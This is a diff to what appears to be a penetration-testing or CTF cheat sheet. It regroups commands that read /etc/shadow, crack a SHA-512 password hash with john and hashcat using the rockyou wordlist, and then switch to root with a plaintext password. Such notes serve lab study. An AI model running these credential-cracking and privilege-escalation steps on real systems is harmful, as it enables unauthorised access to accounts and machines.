@@ -166,13 +166,18 @@ exit
 ```
 ls -l /etc/shadow
 cat /etc/shadow
+```
+```
 echo '$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0' > hash.txt
+cat hash.txt
 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+hashcat -a 0 -m 1800 hash.txt /usr/share/wordlists/rockyou.txt
+hashcat -a 0 -m 1800 hash.txt /usr/share/wordlists/rockyou.txt --show
+```
+```
 su root
 password: password123
 whoami && ifconfig
-hashcat -a 0 -m 1800 hash.txt /usr/share/wordlists/rockyou.txt
-hashcat -a 0 -m 1800 hash.txt /usr/share/wordlists/rockyou.txt --show
 ```
 IMPORTANT FILES
 ```
